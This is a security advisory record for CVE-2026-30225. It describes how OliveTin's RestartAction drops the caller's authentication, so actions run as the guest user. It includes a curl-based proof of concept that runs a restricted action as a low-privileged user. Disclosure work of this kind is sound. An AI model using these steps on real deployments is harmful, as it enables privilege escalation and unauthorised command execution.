@@ -1,0 +1,177 @@
+advisory_id: GHSA-p443-p7w5-2f7f
+datasource_id: github_osv/GHSA-p443-p7w5-2f7f
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-p443-p7w5-2f7f/GHSA-p443-p7w5-2f7f.json
+aliases:
+  - CVE-2026-30225
+summary: |
+  OliveTin's RestartAction always runs actions as guest
+  ### Summary
+  An authentication context confusion vulnerability in RestartAction allows a low‑privileged authenticated user to execute actions they are not permitted to run.
+
+  RestartAction constructs a new internal connect.Request without preserving the original caller’s authentication headers or cookies. When this synthetic request is passed to StartAction, the authentication resolver falls back to the guest user. If the guest account has broader permissions than the authenticated caller, this results in privilege escalation and unauthorized command execution.
+
+  This vulnerability allows a low‑privileged authenticated user to bypass ACL restrictions and execute arbitrary configured shell actions.
+
+  ### Details
+  Affected files:
+
+  service/internal/api/api.go
+
+  service/internal/auth/authcheck.go
+
+  Relevant code in RestartAction:
+
+  ```
+  return api.StartAction(ctx, &connect.Request[apiv1.StartActionRequest]{
+      Msg: &apiv1.StartActionRequest{
+          BindingId:        execReqLogEntry.GetBindingId(),
+          UniqueTrackingId: req.Msg.ExecutionTrackingId,
+      },
+  })
+  ```
+  Authentication in StartAction:
+  ```
+  authenticatedUser := auth.UserFromApiCall(ctx, req, api.cfg)
+  ```
+  Issue:
+
+  1. RestartAction creates a new connect.Request object.
+
+  2. The new request does not preserve caller headers or cookies.
+
+  3. UserFromApiCall() attempts to resolve the user from the request.
+
+  4. Because authentication headers are missing, it falls back to the guest user.
+
+  5. If guest.exec = true while the original caller has exec = false, the action executes with elevated privileges.
+
+  ### PoC
+
+  Configuration:
+  ```
+  defaultPermissions:
+    exec: false
+
+  users:
+    - username: low
+      password: lowpass
+      permissions:
+        exec: false
+
+    - username: guest
+      permissions:
+        exec: true
+
+  actions:
+    - id: restart_bypass_action
+      shell: |
+        echo "pwned" > /tmp/olivetin_restart_bypass.txt
+  ```
+
+  Steps to reproduce:
+
+  Login as low user
+  ```
+  LOW_LOGIN=$(curl -sS -i -X POST \
+    http://localhost:1337/olivetin.api.v1.OliveTinApiService/LocalUserLogin \
+    -H 'Content-Type: application/json' \
+    -d '{"username":"low","password":"lowpass"}')
+
+  LOW_SID=$(printf '%s\n' "$LOW_LOGIN" | tr -d '\r' | \
+    awk -F'[=;]' '/^Set-Cookie: olivetin-sid-local=/{print $2; exit}')
+  ```
+  Attempt direct execution (correctly blocked)
+  ```
+  LOW_RUN=$(curl -sS -X POST \
+    http://localhost:1337/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
+    -H 'Content-Type: application/json' \
+    -H "Cookie: olivetin-sid-local=$LOW_SID" \
+    -d '{"actionId":"restart_bypass_action"}')
+
+  echo "$LOW_RUN"
+  ```
+  This should return permission denied.
+
+  Extract executionTrackingId from response:
+  ```
+  TRACKING_ID=$(printf '%s' "$LOW_RUN" | \
+    sed -n 's/.*"executionTrackingId":"\([^"]*\)".*/\1/p' | head -n1)
+
+  echo "Tracking ID: $TRACKING_ID"
+  ```
+  Call RestartAction:
+  ```
+  curl -sS -X POST \
+    http://localhost:1337/olivetin.api.v1.OliveTinApiService/RestartAction \
+    -H 'Content-Type: application/json' \
+    -H "Cookie: olivetin-sid-local=$LOW_SID" \
+    -d "{\"executionTrackingId\":\"$TRACKING_ID\"}"
+  ```
+  Verify command executed:
+  ```
+  cat /tmp/olivetin_restart_bypass.txt
+  ```
+  Output:
+  ```
+  pwned
+  ```
+
+  ### Impact
+  - Privilege Escalation
+  - ACL Bypass
+  - Unauthorized Command Execution
+
+  Any authenticated low-privilege user can execute actions they are not authorized to run if:
+  - Guest has broader permissions
+  - RestartAction is enabled
+  Because OliveTin actions execute system shell commands, this can lead to:
+  - Arbitrary file writes
+  - Sensitive data exposure
+  - Potential full host compromise (depending on OliveTin runtime privileges)
+
+  This affects all deployments where:
+  - guest.exec = true
+  - A restricted user has exec = false
+  - RestartAction endpoint is accessible
+impacted_packages:
+  - purl: pkg:github/olivetin/olivetin
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/olivetin/olivetin
+        commit: cb46a597b2465235839ed58cf034b5e7b70ef911
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-p443-p7w5-2f7f/GHSA-p443-p7w5-2f7f.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-250
+  - CWE-441
+references:
+  - url: https://github.com/OliveTin/OliveTin
+    reference_type:
+    reference_id:
+  - url: https://github.com/OliveTin/OliveTin/commit/cb46a597b2465235839ed58cf034b5e7b70ef911
+    reference_type:
+    reference_id:
+  - url: https://github.com/OliveTin/OliveTin/releases/tag/3000.11.1
+    reference_type:
+    reference_id:
+  - url: https://github.com/OliveTin/OliveTin/security/advisories/GHSA-p443-p7w5-2f7f
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-30225
+    reference_type:
+    reference_id:
+exploits: []
